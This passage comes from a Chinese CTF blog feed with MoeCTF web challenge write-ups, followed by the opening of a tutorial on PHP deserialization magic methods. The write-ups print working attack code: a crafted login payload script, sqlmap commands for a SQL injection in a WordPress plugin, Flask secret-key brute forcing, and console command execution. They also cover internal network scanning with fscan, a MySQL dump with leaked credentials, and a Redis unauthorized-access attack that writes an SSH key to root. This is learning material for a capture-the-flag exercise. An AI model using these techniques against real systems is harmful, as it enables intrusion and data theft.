number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment">#当传入的参数items为2个时该函数等价于求两个参数的异或值并返回，所以当两个参数相等时不管该参数为何值，返回值都为0</span><span class="token comment">#而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？</span></code></pre><p><strong>而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？</strong></p><p>接下来编写脚本即可把构造的json数据base64编码五次</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url <span class="token operator">=</span> <span class="token string">"http://localhost:5946/login"</span>username <span class="token operator">=</span> <span class="token string">"\"1\""</span>password <span class="token operator">=</span> <span class="token string">"1"</span>jsondata <span class="token operator">=</span> <span class="token string">"&#123;\"username\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">",\"password\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    jsondata <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token string">"&#123;\"params\":\""</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><h4 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h4><p>查看源码页面可发现一个php文件链接</p><p><img src="%E5%BF%83%E6%B5%B71.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*Plugin Name: Visitor auto recorderDescription: Automatically record visitor's identification, still in development, do not use in industry environment!Author: KoKoMi  Still in development! :)*/</span><span class="token comment">// 不许偷看！这些代码我还在调试呢！</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 加载数据库配置，暂时用硬编码绝对路径</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/wordpress/'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db_user</span> <span class="token operator">=</span> <span class="token constant">DB_USER</span><span class="token punctuation">;</span> <span class="token comment">// 数据库用户名</span><span class="token variable">$db_password</span> <span class="token operator">=</span> <span class="token constant">DB_PASSWORD</span><span class="token punctuation">;</span> <span class="token comment">// 数据库密码</span><span class="token variable">$db_name</span> <span class="token operator">=</span> <span class="token constant">DB_NAME</span><span class="token punctuation">;</span> <span class="token comment">// 数据库名称</span><span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token constant">DB_HOST</span><span class="token punctuation">;</span> <span class="token comment">// 数据库主机</span><span class="token comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span><span class="token comment">// 这些是临时的代码</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">,</span> <span class="token variable">$db_user</span><span class="token punctuation">,</span> <span class="token variable">$db_password</span><span class="token punctuation">,</span> <span class="token variable">$db_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 检查连接是否成功</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据库连接失败: '</span> <span class="token operator">.</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('<span class="token interpolation"><span class="token variable">$ip</span></span>', '<span class="token interpolation"><span class="token variable">$user_agent</span></span>', <span class="token interpolation"><span class="token variable">$time</span></span>)"</span><span class="token punctuation">;</span><span class="token comment">// 执行插入</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 检查插入是否成功</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据插入成功'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据插入失败: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 关闭数据库连接</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//gpt真好用</span></span></code></pre><p><img src="%E5%BF%83%E6%B5%B72.png" loading="lazy"></p><p>根据测试发现time存在报错注入</p><p><img src="%E5%BF%83%E6%B5%B73.png" loading="lazy"></p><p>sqlmap一把梭</p><pre class="language-sql" data-language="sql"><code class="language-sql">python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  --dbs  --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress --tables --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress  -T secret_of_kokomi --columns --batch</span></code></pre><h4 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h4><p>首先爆破secret key</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">import</span> zlib<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token comment">#https://github.com/noraj/flask-session-cookie-manager</span><span class="token keyword">class</span> <span class="token class-name">MockApp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>session_cookie_structure <span class="token operator">=</span> session_cookie_structuresi <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">"[Encoding error] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>secret_key <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">False</span>payload <span class="token operator">=</span> session_cookie_value<span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">True</span>payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> compressed<span class="token punctuation">:</span>data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">return</span> data<span class="token keyword">else</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>cookie <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>k <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> <span class="token string">"This-random-secretKey-you-can't-get"</span><span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token keyword">break</span></code></pre><p>secret key是<code>This-random-secretKey-you-can&#39;t-get06f0</code>,有了secret key就能自己修改session为admin。admin的private留言说pin码904-474-531，所以去到<a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a> ，输入pin码则获得console</p><p>执行系统命令：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocesssubprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">,</span><span class="token string">'/flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>获得第一部分flag：<code>moectf&#123;Information-leakage-Is-dangerous!</code></p><p>还有个readme，python decode后看到提示</p><pre class="language-none"><code class="language-none">恭喜你通过外网渗透拿下了本台服务器的权限接下来，你需要尝试内网渗透，本服务器的&#x2F;app&#x2F;tools目录下内置了fscan你需要了解它的基本用法，然后扫描内网的ip段如果你进行了正确的操作，会得到类似下面的结果10.1.11.11:22 open10.1.23.21:8080 open10.1.23.23:9000 open将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务对密码有疑问随时咨询出题人</code></pre><p>提示用fscan，看一下help</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan --help"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>是这个工具： <a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>看一下本机内网ip, 参考 <a href="https://blog.csdn.net/kuanggudejimo/article/details/99454185">https://blog.csdn.net/kuanggudejimo/article/details/99454185</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">;</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'8.8.8.8'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ip <span class="token operator">=</span> s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span></code></pre><p>得到ip为<code>172.21.0.2</code>。扫描：</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan -h 127.21.0.2/24"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>得到hint.zip密码： 22-3306-6379-8080</p><p>然后不要卡在怎么配置frp进行内网穿透，那个要自己开vps，或者要有个自己的公网ip。穿透只是辅助效果，帮助我们渗透更加方便，不配置直接用python console也是可以的。也不要想用ngrok免费版，免费版只能转发一个端口，而穿透至少要两个端口。直接去搞mysql：</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"cat dataSql.py"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>得到sql数据库交互的源码，里面有用户名和密码。连接:</p><pre class="language-python" data-language="python"><code class="language-python">db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span>passwd<span class="token operator">=</span><span class="token string">"The_P0sswOrD_Y0u_Nev3r_Kn0w"</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">"messageboard"</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span></code></pre><p>查内容：</p><pre class="language-python" data-language="python"><code class="language-python">cursor<span class="token operator">=</span>db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'messageboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(table_name))from(information_schema.tables)where(table_schema)='messageboard'"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag,message,users'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(flag))from(flag)"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'-Are-YOu-myS0L-MasT3r?-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>最后是redis。用python装个redis模块（不知道为啥apt-get install装不了？）：</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install redis"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>然后连接</p><pre class="language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>从info中得知redis存在未授权访问漏洞。根据 https:&#x2F;&#x2F;_thorns.gitbooks.io&#x2F;sec&#x2F;content&#x2F;redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html 往root写ssh key。public_key和privkey利用<code>ssh-keygen -t rsa</code>生成</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'aaaaaaaaaa'</span><span class="token punctuation">,</span> <span class="token string">'\n\n'</span> <span class="token operator">+</span> public_key <span class="token operator">+</span> <span class="token string">'\n\n'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>参考 <a href="https://www.cnblogs.com/wongbingming/articles/12384764.html">https://www.cnblogs.com/wongbingming/articles/12384764.html</a> ，安装paramiko进行ssh连接</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install paramiko"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">import</span> paramiko<span class="token operator">>></span><span class="token operator">></span> pkey <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span><span class="token string">'privkey'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>username<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>pkey<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh<span class="token punctuation">.</span>_transport <span class="token operator">=</span> trans<span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p> <strong>Flag</strong></p><blockquote><p>moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-php_unserialize</title>
      <link href="/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/"/>
      <url>/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><a href="https://hello-ctf.com/HC_Web/php_unser_base/">PHP 序列化及反序列化基础</a></p><p><a href="https://blog.csdn.net/jayq1/article/details/131858372">反序列化学习笔记</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHP反序列化总结</a></p><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>在 PHP 的序列化中，魔术方法（Magic Methods）是一组特殊的方法，这些方法以双下划线（<code>__</code>）作为前缀，可以在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 &#x2F; 反序列化 的过程。</p><p>你可以在 PHP 官方文档中查找到对应魔术方法的定义和使用方法：<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: 魔术方法 - Manual</a></p><p>一般在题目中常见的几个方法如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ 执行unserialize()时，先会调用这个函数</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- 执行serialize()时，先会调用这个函数</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- 对象被销毁时触发</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//-------- 在对象上下文中调用不可访问的方法时触发</span><span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//-- 在静态上下文中调用不可访问的方法时触发</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- 用于将数据写入不可访问的属性</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- 在不可访问的属性上调用isset()或empty()触发</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------- 在不可访问的属性上使用unset()时触发</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- 把类当作字符串使用时触发</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ 当尝试将对象调用为函数时触发</span></code></pre><p>一份比较全面的表格：</p><table><thead><tr><th align="left">magicMethods</th><th align="left">attribute</th></tr></thead><tbody><tr><td align="left">__construct</td><td align="left">当一个对象被创建时自动调用这个方法，可以用来初始化对象的属性。</td></tr><tr><td align="left">__destruct</td><td align="left">当一个对象被销毁时自动调用这个方法，可以用来释放对象占用的资源。</td></tr><tr><td align="left">__call</td><td 